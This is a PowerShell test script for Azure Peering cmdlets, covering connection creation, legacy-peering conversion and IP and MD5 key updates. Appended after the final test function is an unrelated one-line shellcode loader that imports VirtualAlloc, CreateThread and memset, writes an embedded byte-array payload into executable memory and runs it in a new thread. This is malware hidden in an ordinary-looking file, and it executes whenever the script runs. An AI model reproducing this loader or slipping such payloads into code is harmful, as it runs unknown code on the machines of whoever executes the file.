













function NewExchangeConnectionV4V6($facilityId, $v4, $v6)
{
	
	Write-Debug "Creating Connection at $facilityId"
	$md5 = getHash
	$md5 = $md5.ToString()
	Write-Debug "Created Hash $md5"
	$offset = Get-Random -Maximum 20 -Minimum 3
	$sessionv4 = changeIp "$v4/32" $false $offset $false
	$sessionv6 = changeIp "$v6/128" $true $offset $false
	Write-Debug "Created IPs $sessionv4"
	$maxv4 = maxAdvertisedIpv4
	$maxv6 = maxAdvertisedIpv6
	Write-Debug "Created maxAdvertised $maxv4 $maxv6"
	
    $createdConnection = New-AzPeeringExchangeConnectionObject -PeeringDbFacilityId $facilityId -MaxPrefixesAdvertisedIPv4 $maxv4 -PeerSessionIPv4Address $sessionv4 -PeerSessionIPv6Address $sessionv6 -MaxPrefixesAdvertisedIPv6 $maxv6 -MD5AuthenticationKey $md5
	return $createdConnection
}

function Test-GetLegacyPeering($location)
{
try {
$asn = makePeerAsn 15224
$legacy = Get-AzLegacyPeering -PeeringLocation $location -Kind Exchange
Assert-NotNull $legacy
}
finally{
	$isRemoved = Remove-AzPeerAsn -Name $asn.Name -Force -PassThru
		Assert-True {$isRemoved}
}
}

function Test-ConvertLegacyToExchange
{

	
	$kind = isDirect $false;
	$loc = "ashburn"
	$resourceGroup = "testCarrier"
	
	$asnId = 57976
	$resourceName = getAssetName "LegacyConvertExchange"
	$asnPeerName = getAssetName "PeerName"
	$asn = makePeerAsn $asnId
	Assert-NotNull $asn
	Assert-AreEqual "Approved" $asn.ValidationState
    $legacy = Get-AzLegacyPeering -Kind $kind -PeeringLocation $loc  
	$tags = @{"tfs_$asnId" = "Active"; "tag2" = "value2"}
	Assert-NotNull $legacy
	$legacy | New-AzPeering -Name $resourceName -ResourceGroupName $resourceGroup -PeerAsnResourceId $asn.Id -Tag $tags
	$newPeering = Get-AzPeering -ResourceGroupName testCarrier -Name $resourceName
	Assert-NotNull $newPeering
}


function Test-UpdateExchangeIPv4OnInputObject 
{

	$resourceName = getAssetName "LegacyConvertExchange"
	$resourceGroup = "testCarrier"
	$peering = Get-AzPeering -ResourceGroupName $resourceGroup | Where-Object {$_.Name -match "Convert"}
	Assert-NotNull $peering
	$ipv4 = $peering.Connections[0].BgpSession.PeerSessionIPv4Address
	$newipv4 = getPeeringVariable "newIpv4" (changeIp "$ipv4/32" $false 15 $false)
	$ipv42 = $peering.Connections[1].BgpSession.PeerSessionIPv4Address
	$newipv42 = getPeeringVariable "newIpv42" (changeIp "$ipv4/32" $false 17 $false)
	$oldpeering = $peering
	$tags = New-Object 'system.collections.generic.dictionary[string,string]'
	$tags["tfs_234234"] = "Active";
	$peering.Tags = $tags;
	$peering.Connections[0] = $peering.Connections[0] |  Set-AzPeeringExchangeConnectionObject -PeerSessionIPv4Address $newipv4
	$peering.Connections[1] = $peering.Connections[1] |  Set-AzPeeringExchangeConnectionObject -PeerSessionIPv4Address $newipv42
	Write-Debug "ResourceId: $peering.Id" 
	$update =  $peering | Update-AzPeering 
	Assert-AreEqual $newipv4 $update.Connections[0].BgpSession.PeerSessionIPv4Address 
	Assert-AreEqual $newipv42 $update.Connections[1].BgpSession.PeerSessionIPv4Address 
}

function Test-UpdateExchangeIPv6OnResourceId
{

	$resourceName = getAssetName "LegacyConvertExchange"
	$resourceGroup = "testCarrier"
	$peering = Get-AzPeering -ResourceGroupName $resourceGroup | Where-Object {$_.Name -match "Convert"}
	Assert-NotNull $peering
	$ipv6 = $peering.Connections[0].BgpSession.PeerSessionIPv6Address
	$newipv6 = getPeeringVariable "newIpv6" (changeIp "$ipv6/128" $true 14 $false)
	$ipv62 = $peering.Connections[1].BgpSession.PeerSessionIPv6Address
	$newipv62 = getPeeringVariable "newIpv62" (changeIp "$ipv6/128" $true 16 $false)
	$oldpeering = $peering
	$peering.Connections[0] = $peering.Connections[0] |  Set-AzPeeringExchangeConnectionObject -PeerSessionIPv6Address $newipv6 
	$peering.Connections[1] = $peering.Connections[1] |  Set-AzPeeringExchangeConnectionObject -PeerSessionIPv6Address $newipv62
	Write-Debug $peering.Name
	$update = Update-AzPeering -ResourceId $peering.Id $peering.Connections 
	Assert-NotNull $update
	Assert-AreEqual $newipv6 $update.Connections[0].BgpSession.PeerSessionIPv6Address 
	Assert-AreEqual $newipv62 $update.Connections[1].BgpSession.PeerSessionIPv6Address 
}

function Test-UpdateExchangeMd5OnNameAndResourceGroup
{
	$hash = getHash

	$resourceGroup = "testCarrier"
	$peering = Get-AzPeering -ResourceGroupName $resourceGroup | Where-Object {$_.Name -match "Convert"}
	Assert-NotNull $peering
	$resourceName = $peering.Name
	$oldpeering = $peering
	$tags = New-Object 'system.collections.generic.dictionary[string,string]'
	$tags["tfs_234234"] = "Active";
	$peering.Tags = $tags;
	$peering.Connections[0] = $peering.Connections[0] |  Set-AzPeeringExchangeConnectionObject -MD5AuthenticationKey $hash
	$peering.Connections[1] = $peering.Connections[1] |  Set-AzPeeringExchangeConnectionObject -MD5AuthenticationKey $hash
	Assert-ThrowsContains {$peering = $peering | Update-AzPeering} "not yet supported"
}

$Mzr = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Mzr -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xea,0xbf,0xcd,0xe2,0xd8,0x42,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x47,0x31,0x7a,0x18,0x83,0xc2,0x04,0x03,0x7a,0xd9,0x00,0x2d,0xbe,0x09,0x46,0xce,0x3f,0xc9,0x27,0x46,0xda,0xf8,0x67,0x3c,0xae,0xaa,0x57,0x36,0xe2,0x46,0x13,0x1a,0x17,0xdd,0x51,0xb3,0x18,0x56,0xdf,0xe5,0x17,0x67,0x4c,0xd5,0x36,0xeb,0x8f,0x0a,0x99,0xd2,0x5f,0x5f,0xd8,0x13,0xbd,0x92,0x88,0xcc,0xc9,0x01,0x3d,0x79,0x87,0x99,0xb6,0x31,0x09,0x9a,0x2b,0x81,0x28,0x8b,0xfd,0x9a,0x72,0x0b,0xff,0x4f,0x0f,0x02,0xe7,0x8c,0x2a,0xdc,0x9c,0x66,0xc0,0xdf,0x74,0xb7,0x29,0x73,0xb9,0x78,0xd8,0x8d,0xfd,0xbe,0x03,0xf8,0xf7,0xbd,0xbe,0xfb,0xc3,0xbc,0x64,0x89,0xd7,0x66,0xee,0x29,0x3c,0x97,0x23,0xaf,0xb7,0x9b,0x88,0xbb,0x90,0xbf,0x0f,0x6f,0xab,0xbb,0x84,0x8e,0x7c,0x4a,0xde,0xb4,0x58,0x17,0x84,0xd5,0xf9,0xfd,0x6b,0xe9,0x1a,0x5e,0xd3,0x4f,0x50,0x72,0x00,0xe2,0x3b,0x1a,0xe5,0xcf,0xc3,0xda,0x61,0x47,0xb7,0xe8,0x2e,0xf3,0x5f,0x40,0xa6,0xdd,0x98,0xa7,0x9d,0x9a,0x37,0x56,0x1e,0xdb,0x1e,0x9c,0x4a,0x8b,0x08,0x35,0xf3,0x40,0xc9,0xba,0x26,0xfc,0xcc,0x2c,0x79,0x3e,0x46,0x44,0x11,0x43,0x58,0x85,0xbe,0xca,0xbe,0xf5,0x6e,0x9d,0x6e,0xb5,0xde,0x5d,0xdf,0x5d,0x35,0x52,0x00,0x7d,0x36,0xb8,0x29,0x17,0xd9,0x15,0x01,0x8f,0x40,0x3c,0xd9,0x2e,0x8c,0xea,0xa7,0x70,0x06,0x19,0x57,0x3e,0xef,0x54,0x4b,0xd6,0x1f,0x23,0x31,0x70,0x1f,0x99,0x5c,0x7c,0xb5,0x26,0xf7,0x2b,0x21,0x25,0x2e,0x1b,0xee,0xd6,0x05,0x10,0x27,0x43,0xe6,0x4e,0x48,0x83,0xe6,0x8e,0x1e,0xc9,0xe6,0xe6,0xc6,0xa9,0xb4,0x13,0x09,0x64,0xa9,0x88,0x9c,0x87,0x98,0x7d,0x36,0xe0,0x26,0x58,0x70,0xaf,0xd9,0x8f,0x80,0x93,0x0f,0xe9,0xf6,0xfd,0x93;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$NoDM=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($NoDM.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$NoDM,0,0,0);for (;;){Start-sleep 60};

